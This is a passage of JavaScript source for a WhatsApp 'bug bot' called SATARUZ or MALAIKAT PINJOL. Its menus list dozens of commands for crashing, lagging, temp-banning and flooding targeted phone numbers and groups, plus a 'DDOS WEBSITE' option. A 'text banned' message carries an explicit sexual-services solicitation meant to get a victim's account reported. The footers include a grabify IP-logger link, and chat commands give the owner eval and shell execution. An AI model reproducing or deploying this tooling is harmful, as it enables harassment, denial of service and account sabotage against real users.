                    https://api.whatsapp.com/send?phone=+628\"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb8.message, {});
                break
            case 'textb9':
        let textb9 = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `🦄 SATARUZ`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': `Hello ${pushname}`
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> TEXT BANNED </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': false,
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [ {
                    "name": "cta_copy",
                    "buttonParamsJson":` {\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"
                    こんにちは、私の名前はサクラです。性交と VCS サービスを提供したいと思います 🤤 

私のオマンコはピンク色でスベスベで体も素敵なので、あなたにオファーします 😋 ご注文いただくと以下の特典が付きます👇👇 

•5つ星のホテルを提供します⭐ 
•どんな性交スタイルもリクエスト可能✔️ 
•アニメの服を着たり、コスプレしたりします😋 
•何でもできます🤤 
•マンコはピンク色で滑らかです 
•いいからだ 

価格だけで注文したい場合は💸 50 ドルから 100 ドルで上記のすべての設備が利用できます🤗 

私に注文したい場合は、下記の☎️whatsapp番号にご連絡ください👇👇 https://api.whatsapp.com/send?phone=+628

WORK TAG @xyzxw
                    \"}`
                 },]
                })
              })
            },
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, textb9.message, {});
                break
            case 'menubug':
                case 'merah':

let Yoshmenuohh = `${Yoshytimewisher} 😄
⛩️• Name : ${pushname}
⛩️• Bot Name : *MALAIKAT PINJOL*
${readmore}
┈────────────⏣
*M E N U   BUG*
┈────────────⏣

1 • xreact <reply chat>
2 • x <number|amount>
3 • x2 <amount>
4 • iosbug <number|amount>
5 • iosbug2 <amount>
6 • xaudio <number|amount>
7 • xaudio2 <amount>
8 • xsticker <number|amount>
9 • xsticker2 <amount>
10 • xloc <number|amount>
11 • xloc2 <amount>
12 • xlist <number|amount>
13 • xlist2 <amount>
14 • xkill <number|amount>
15 • xkill2 <amount>
16 • xkillgc <link group>
17 • tempban <code|number>
18 • xcrash <number>
19 • xcrash2 <amount>
20 • xioscrash <number>
21 • xioscrash2 <amount>
22 • iosgoogle <number>
23 • iosgoogle2 <amount>
24 • iosq <number>

`
if (typemenu === 'v1') {

    
                    Yosh.sendMessage(m.chat, {
                        text: Yoshmenuohh,
                        contextInfo: { 
  forwardingScore: 99999999, 
  isForwarded: true, 
  mentionedJid: [sender],
  businessMessageForwardInfo: { 
      businessOwnerJid:'6288980818668@s.whatsapp.net'
  },
  forwardedNewsletterMessageInfo: {
      newsletterJid: '120363192485906802@newsletter',
      serverMessageId: 103,
      newsletterName: "🔴 MALAIKAT PINJOL 🔴"
  },
      externalAdReply: {
          title: `🔥 CUAN CUAN 🔥`,
          body: `Singkat aja :G Target G Cuan!!`,
      thumbnailUrl: 'https://i.pinimg.com/564x/d1/ca/36/d1ca36800d85dd04c01f0213c725fd74.jpg',
                 
      mediaType: 1,
      renderLargerThumbnail: true
  }
  }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    Yosh.sendMessage(m.chat, {
      video: fs.readFileSync('./YoshMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: Yoshmenuohh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    Yosh.sendMessage(m.chat, {
                        video: fs.readFileSync('./YoshMedia/thumb2.mp4'),
                        caption: Yoshmenuohh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    Yosh.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
 callType: "AUDIO",
 scheduledTimestampMs: 1200,
 title: Yoshmenuohh
                        }
                    }, {})
                }
                break
               
            case 'bugmenu':
                case 'kuning':
        let kuning = generateWAMessageFromContent(m.chat, {
          'interactiveMessage': {
            'body': {
              'text': "⛩️• Bot Name : *SATARUZ*\n`Ketik Angka/Perintah`\n\n1 • xreact <reply chat>\n2 • x <number|amount>\n3 • x2 <amount>\n4 • iosbug <number|amount>\n5 • iosbug2 <amount>\n6 • xaudio <number|amount>\n7 • xaudio2 <amount>\n8 • xsticker <number|amount>\n9 • xsticker2 <amount>\n10 • xloc <number|amount>\n11 • xloc2 <amount>\n12 • xlist <number|amount>\n13 • xlist2 <amount>\n14 • xkill <number|amount>\n15 • xkill2 <amount>\n16 • xkillgc <link group>\n17 • tempban <code|number>\n18 • xcrash <number>\n19 • xcrash2 <amount>\n20 • xioscrash <number>\n21 • xioscrash2 <amount>\n22 • iosgoogle <number>\n23 • iosgoogle2 <amount>\n24 • iosq <number>\n25 • amountbug <number>\n26 • pmbug <number>\n27 • delaybug <number>\n28 • docbug <number>\n29 • unlimitedbug <number>\n30 • bombug <number>\n31 • lagbug <number>\n32 • trollybug <number>\n33 • gcbug <linkgc>\n34 • delaygcbug <linkgc>\n35 • laggcbug <linkgc>\n36 • bomgcbug <linkgc>\n37 • unlimitedgcbug <linkgc>\n38 • trollygcbug <linkgc>\n39 • docugcbug <linkgc>\n\n➤ • allmenu <semua menu>\n┈────────────⏣"
            },
            'footer': {
              'text': "➤ Powered by : </>*TeamCassaster*</>\n➤ Website : _whatsapp.com_"
            },
            'header': {
              'title': "`</> BUG MENU </>`",
              'hasMediaAttachment': false
            },
            'nativeFlowMessage': {
              'buttons': [{
                'name': "quick_reply",
                'buttonParamsJson': "{\"display_text\":\"↪️ Back\",\"id\":\".menu\"}"
              }]
            },
            'contextInfo': {
              'forwardingScore': 0x5f5e0ff,
              'isForwarded': true,
              'mentionedJid': null,
              'businessMessageForwardInfo': {
                'businessOwnerJid': "6288980818668@s.whatsapp.net"
              },
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363192485906802@newsletter",
                'serverMessageId': -1,
                'newsletterName': "🟡 SATARUZ 🟡"
              },
              'externalAdReply': {
                'title': "🔥 CUAN CUAN 🔥",
                'body': "Singkat aja :G Target G Cuan!!",
                'thumbnailUrl': "https://i.pinimg.com/564x/d1/ca/36/d1ca36800d85dd04c01f0213c725fd74.jpg",
                'mediaType': 1,
                'renderLargerThumbnail': true
              }
            }
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, kuning.message, {});
        break;
                
                case 'menu':
                    
                const media = await prepareWAMessageMedia({
                    'image': await fetch('https://telegra.ph/file/774da4feffdc5af3decda.png')
                  }, {
                    'upload': Yosh.waUploadToServer
                  });
        let msgt = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'contextInfo': {
                  'mentionedJid': null,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': "0@newsletter",
                    'newsletterName': "Powered By 🦄 SATARUZ",
                    'serverMessageId': -1
                  },
                  'businessMessageForwardInfo': {
                    'businessOwnerJid': "0@s.whatsapp.net"
                  },
                  'externalAdReply': {
                    'title': "🦄 SATARUZ",
                    'thumbnailUrl': 'https://telegra.ph/file/40da4c69c82e244a72500.jpg',
                    'sourceUrl': '',
                    'mediaType': 1,
                    'renderLargerThumbnail': true
                  }
                },
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `⛩️• Name : " ${pushname} " \n⛩️• Bot Name : *🦄 SATARUZ* \n\n┈────────────⏣ \n> • *SATARUZ*\n• Bot Bug Whatsapp\n• Saya dibuat oleh...\n ┈────────────⏣`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': "➤ Powered by : </>*TeamCassaster*</>\n➤ Website : _https://grabify.link/1VOEJ5_"
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> DASHBOARD </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': true,
                  ...media
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                "name": "single_select",
                "buttonParamsJson": `{\"title\":\"⚠ SATARUZ MENU ⚠\",\"sections\":
                [{\"title\":\"⚠☢ W A R N I N G ⚠☢\",\"highlight_label\":\"⚠☢READ\",\"rows\":
                [{\"header\":\"⚠☢ GUNAKAN\",\"title\":\"⚠☢ DENGAN\",\"description\":\"BIJAK\",\"id\":\".owner\"}]},

                {\"title\":\"TEMPOR 💢\",\"highlight_label\":\"💢 KLIK \",\"rows\":
                [{\"header\":\"💢| Whatsapp【0】\",\"title\":\"TEMPOR\",\"description\":\"Tempor OTP\",\"id\":\".tempor\"}]},
                
                {\"title\":\"DDOS 💥\",\"highlight_label\":\"💥 KLIK \",\"rows\":
                [{\"header\":\"💥| Whatsapp【0】\",\"title\":\"DDOS\",\"description\":\"DDOS WEBSITE\",\"id\":\".ddos\"}]},
                
                {\"title\":\"TEMPBAND⛔\",\"highlight_label\":\"⛔ KLIK \",\"rows\":
                [{\"header\":\"⛔| Whatsapp【0】\",\"title\":\"Tempban\",\"description\":\"Temp Banned\",\"id\":\".tempban\"}]},

                {\"title\":\"TEXT BANNED ❎\",\"highlight_label\":\"❎ KLIK \",\"rows\":
                [{\"header\":\"❎| Whatsapp【0】\",\"title\":\"Text Banned\",\"description\":\"Text Banned\",\"id\":\".textban\"}]},

                {\"title\":\"TEXT UNBANNED ✅\",\"highlight_label\":\"✅ KLIK \",\"rows\":
                [{\"header\":\"✅| Whatsapp【0】\",\"title\":\"Text Unban\",\"description\":\"Text Banned\",\"id\":\".textunban\"}]},

                {\"title\":\"ANDROID 📱\",\"highlight_label\":\"🎃 GANAS \",\"rows\":
                [{\"header\":\"🦄| Android【1】\",\"title\":\"xreact\",\"description\":\"Replay Chat\",\"id\":\".1\"},
                {\"header\":\"🦄| Android【2】\",\"title\":\"x\",\"description\":\"No Target|Jumlah\",\"id\":\".2\"},
                {\"header\":\"🦄| Android【3】\",\"title\":\"x2\",\"description\":\"Jumlah\",\"id\":\".3\"},
                {\"header\":\"🦄| Android【4】\",\"title\":\"xaudio\",\"description\":\"No Target|Jumlah\",\"id\":\".6\"},
                {\"header\":\"🦄| Android【5】\",\"title\":\"xaudio2\",\"description\":\"Jumlah\",\"id\":\".7\"},
                {\"header\":\"🦄| Android【6】\",\"title\":\"xsticker\",\"description\":\"No Target|Jumlah\",\"id\":\".8\"},
                {\"header\":\"🦄| Android【7】\",\"title\":\"xsticker2\",\"description\":\"Jumlah\",\"id\":\".9\"},
                {\"header\":\"🦄| Android【8】\",\"title\":\"xloc\",\"description\":\"No Target|Jumlah\",\"id\":\".10\"},
                {\"header\":\"🦄| Android【9】\",\"title\":\"xloc2\",\"description\":\"Jumlah\",\"id\":\".11\"},
                {\"header\":\"🦄| Android【10】\",\"title\":\"xlist\",\"description\":\"No Target|Jumlah\",\"id\":\".12\"},
                {\"header\":\"🦄| Android【11】\",\"title\":\"xlist2\",\"description\":\"Jumlah\",\"id\":\".13\"},
                {\"header\":\"🦄| Android【12】\",\"title\":\"xkill\",\"description\":\"No Target|Jumlah\",\"id\":\".14\"},
                {\"header\":\"🦄| Android【13】\",\"title\":\"xkill2\",\"description\":\"No Target\",\"id\":\".15\"},
                {\"header\":\"🦄| Android【14】\",\"title\":\"amountbug\",\"description\":\"No Target\",\"id\":\".25\"},
                {\"header\":\"🦄| Android【15】\",\"title\":\"pmbug\",\"description\":\"No Target\",\"id\":\".26\"},
                {\"header\":\"🦄| Android【16】\",\"title\":\"delaybug\",\"description\":\"No Target\",\"id\":\".27\"},
                {\"header\":\"🦄| Android【17】\",\"title\":\"docbug\",\"description\":\"No Target\",\"id\":\".28\"},
                {\"header\":\"🦄| Android【18】\",\"title\":\"unlimitedbug\",\"description\":\"No Target\",\"id\":\".29\"},
                {\"header\":\"🦄| Android【19】\",\"title\":\"bombug\",\"description\":\"No Target\",\"id\":\".30\"},
                {\"header\":\"🦄| Android【20】\",\"title\":\"lagbug\",\"description\":\"No Target\",\"id\":\".31\"},
                {\"header\":\"🦄| Android【21】\",\"title\":\"trollybug\",\"description\":\"No Target\",\"id\":\".32\"}]},
                
                {\"title\":\"iOS 📱\",\"highlight_label\":\"🎈 GANAS\",\"rows\":
                [{\"header\":\"🛡| iOS【1】\",\"title\":\"iosbug\",\"description\":\"No Target|Jumlah\",\"id\":\".4\"},
                {\"header\":\"🛡| iOS【2】\",\"title\":\"iosbug2\",\"description\":\"Jumlah\",\"id\":\".5\"},
                {\"header\":\"🛡| iOS【3】\",\"title\":\"xioscrash\",\"description\":\"No Target\",\"id\":\".20\"},
                {\"header\":\"🛡| iOS【4】\",\"title\":\"xioscrash2\",\"description\":\"Jumlah\",\"id\":\".21\"},
                {\"header\":\"🛡| iOS【5】\",\"title\":\"iosgoogle\",\"description\":\"No Target\",\"id\":\".22\"},
                {\"header\":\"🛡| iOS【6】\",\"title\":\"iosgoogle2\",\"description\":\"Jumlah\",\"id\":\".23\"},
                {\"header\":\"🛡| iOS【7】\",\"title\":\"iosq\",\"description\":\"No Target\",\"id\":\".24\"}]},

                {\"title\":\"Boom Group x Android 💣\",\"highlight_label\":\"💥 GANAS\",\"rows\":
                [{\"header\":\"💣| Group【1】\",\"title\":\"gcbug\",\"description\":\"Link Group\",\"id\":\".33\"},
                {\"header\":\"💣| Group【2】\",\"title\":\"delaygcbug\",\"description\":\"Link Group\",\"id\":\".34\"},
                {\"header\":\"💣| Group【3】\",\"title\":\"laggcbug\",\"description\":\"Link Group\",\"id\":\".35\"},
                {\"header\":\"💣| Group【4】\",\"title\":\"bomgcbug\",\"description\":\"Link Group\",\"id\":\".36\"},
                {\"header\":\"💣| Group【5】\",\"title\":\"unlimitedgcbug\",\"description\":\"Link Group\",\"id\":\".37\"},
                {\"header\":\"💣| Group【6】\",\"title\":\"trollygcbug\",\"description\":\"Link Group\",\"id\":\".38\"},
                {\"header\":\"💣| Group【7】\",\"title\":\"docgcbug\",\"description\":\"Link Group\",\"id\":\".39\"}]}]}`
              },{
                    'name': 'cta_url',
                    'buttonParamsJson': "{\"display_text\":\"🌐 Portofolio\",\"url\":\"https://yoshcasaster.github.io/WebLinkedLvy/\",\"merchant_url\":\"https://yoshcasaster.github.io/WebLinkedLvy/\"}"
                  }, {
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"📄 AllMenu\",\"id\":\".allmenu\"}"
                  },{
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"©️ SCode\",\"id\":\".sc\"}"
                  }, {
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"®️ Owner\",\"id\":\".owner\"}"
                  }]
                })
              })
            },
            'contextInfo': {
              'forwardingScore': 289,
              'isForwarded': true,
              'mentionedJid': null,
              'businessMessageForwardInfo': {
                'businessOwnerJid': "6288980818668@s.whatsapp.net"
              },
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363192485906802@newsletter",
                'serverMessageId': 1,
                'newsletterName': "🦄 SATARUZ "
              }
            }
          }
        }, {
          'quoted': m
        });
        Yosh.relayMessage(m.chat, msgt.message, {});
        break;
      case 'yosepku':
      case 'boti':
        let msgn = generateWAMessageFromContent(m.chat, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'contextInfo': {
                  'mentionedJid': null,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': '0@newsletter',
                    'newsletterName': "Powered By 🦄 SATARUZ",
                    'serverMessageId': -1
                  },
                  'businessMessageForwardInfo': {
                    'businessOwnerJid': "0@s.whatsapp.net"
                  },
                  'externalAdReply': {
                    'title': "🦄 SATARUZ",
                    'thumbnailUrl': 'https://telegra.ph/file/40da4c69c82e244a72500.jpg',
                    'sourceUrl': '',
                    'mediaType': 1,
                    'renderLargerThumbnail': true
                  }
                },
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': `⛩️• Name : "${pushname} "\n⛩️• Bot Name : *🦄 SATARUZ*\n" + readmore + "\n┈────────────⏣\n🇮🇩 [INDONESIA]\n> • Pelajari hari Ini, terapkan hari Ini.\n🇬🇧 [INGGRIS]\n> • Learn today, apply today.\n🚩 [LATIN]\n> • Disce hodie, hodie applica.\n\n┈────────────⏣`
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': "➤ Powered by : </>TeamCassaster</>\n➤ Website : _https://grabify.link/1VOEJ5_"
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': "`</> BUG MENU </>`\n",
                  'subtitle': '--',
                  'hasMediaAttachment': true,
                  ...(await prepareWAMessageMedia({
                    'image': await fetch("https://telegra.ph/file/1fe608177f2bd0d1a1c1f.png")
                  }, {
                    'upload': Yosh.waUploadToServer
                  }))
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "single_select",
                    'buttonParamsJson': "{\"title\":\"🦄 ANDROID \",\"sections\":[{\"title\":\"</>  A N D R O I D  </>\",\"highlight_label\":\"Paporit\",\"rows\":[{\"header\":\"🦄 1\",\"title\":\"Xreact\",\"description\":\"Reply Chat (GC/PM)\",\"id\":\".xreact\"},{\"header\":\"🦄 2\",\"title\":\"x\",\"description\":\"Masukan No Target & Jumlah\",\"id\":\".x\"},{\"header\":\"🦄 3\",\"title\":\"X2\",\"description\":\"Masukan Jumlah\",\"id\":\".x2\"},{\"header\":\"🦄 4\",\"title\":\"Xaudio\",\"description\":\"Masukan No Target & Jumlah\",\"id\":\".xaudio\"},{\"header\":\"🦄 5\",\"title\":\"Xaudio2\",\"description\":\"Masukan Jumlah\",\"id\":\".xaudio2\"},{\"header\":\"🦄 6\",\"title\":\"Xsticker\",\"description\":\"Masukan No Target & Jumlah\",\"id\":\".xsticker\"},{\"header\":\"🦄 7\",\"title\":\"Xsticker2\",\"description\":\"Masukan Jumlah\",\"id\":\".xsticker2\"},{\"header\":\"🦄 8\",\"title\":\"Xloc\",\"description\":\"Masukan No Target & Jumlah\",\"id\":\".xloc\"},{\"header\":\"🦄 9\",\"title\":\"Xloc2\",\"description\":\"Masukan Jumlah\",\"id\":\".xloc2\"},{\"header\":\"🦄 10\",\"title\":\"Xlist\",\"description\":\"Masukan No Target & Jumlah\",\"id\":\".xlist\"},{\"header\":\"🦄 11\",\"title\":\"Xlist2\",\"description\":\"Masukan Jumlah\",\"id\":\".xlist2\"},{\"header\":\"🦄 12\",\"title\":\"Xkill\",\"description\":\"Masukan No Target & Jumlah\",\"id\":\".xkill\"},{\"header\":\"🦄 13\",\"title\":\"Xkill2\",\"description\":\"Masukan Jumlah\",\"id\":\".xkill2\"},{\"header\":\"🦄 14\",\"title\":\"Xkillgc\",\"description\":\"Masukan Link Group\",\"id\":\".xkillgc\"},{\"header\":\"🦄 15\",\"title\":\"Xcrach\",\"description\":\"Masukan No Target \",\"id\":\".xcrash\"},{\"header\":\"🦄 16\",\"title\":\"Xcrash2\",\"description\":\"Masukan Jumlah\",\"id\":\".xcrash2\"}]}]}"
                  }, {
                    'name': 'single_select',
                    'buttonParamsJson': "{\"title\":\"💀IOS\",\"sections\":[{\"title\":\"</>  i O S  </>\",\"highlight_label\":\"Paporit\",\"rows\":[{\"header\":\"💀 1\",\"title\":\"iosbug\",\"description\":\"Masukan No Target & Jumlah\",\"id\":\".iosbug\"},{\"header\":\"💀 2\",\"title\":\"iosbug2\",\"description\":\"Masukan Jumlah\",\"id\":\".iosbug2\"},{\"header\":\"💀 3\",\"title\":\"X2\",\"description\":\"Masukan Jumlah\",\"id\":\".x2\"},{\"header\":\"💀 4\",\"title\":\"iosgoogle\",\"description\":\"Masukan No Target\",\"id\":\".iosgoogle\"},{\"header\":\"💀 5\",\"title\":\"iosgoogle2\",\"description\":\"Masukan Jumlah\",\"id\":\".iosgoogle2\"},{\"header\":\"💀 6\",\"title\":\"iosq\",\"description\":\"Masukan No Target\",\"id\":\".iosq\"}]}]}"
                  }, {
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"💥 Menu Bug 2 \",\"id\":\".kuning\"}"
                  }, {
                    'name': 'quick_reply',
                    'buttonParamsJson': "{\"display_text\":\"❕❗ Temp Ban\",\"id\":\".17\"}"
                  }, {
                    'name': "quick_reply",
                    'buttonParamsJson': "{\"display_text\":\"↪️ Back\",\"id\":\".menu\"}"
                  }]
                })
              })
            }
          }
        }, {});
        await Yosh.relayMessage(msgn.key.remoteJid, msgn.message, {
          'messageId': msgn.key.id
        });
        break;
              
               /* Disini Gconly */
               case 'gconly': {
               const fs = require('fs');

const filePath = './database/gconly.json';

fs.readFile(filePath, 'utf8', (err, data) => {
  if (err) {
    console.error('Error reading file:', err);
    return;
  }

  let jsonData = JSON.parse(data);

if (!args[0]) {
reply('Argumen tidak valid. Gunakan "on" atau "off" untuk mengatur mode gconly.');
    return;
  }
  
  if (args[0].includes('on')) {
    jsonData.gconly = true;
    m.reply('Mode gconly telah diaktifkan.');
  } else if (args[0].includes('off')) {
    jsonData.gconly = false;
    m.reply('Mode gconly telah dinonaktifkan.');
  }
  
  fs.writeFile(filePath, JSON.stringify(jsonData), 'utf8', (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return;
    }
    console.log('Nilai gconly telah diperbarui.');
  });
})
               }
               break
               
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcYosh(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
  bang = util.format(sul)
                        }
                        return replygcYosh(bang)
                    }
                    try {
                        replygcYosh(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcYosh(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcYosh(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcYosh(evaled)
                    } catch (err) {
                        await replygcYosh(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcYosh(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcYosh(err)
                        if (stdout) return replygcYosh(stdout)
                    })
                }
        }
    } catch (err) {
        Yosh.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})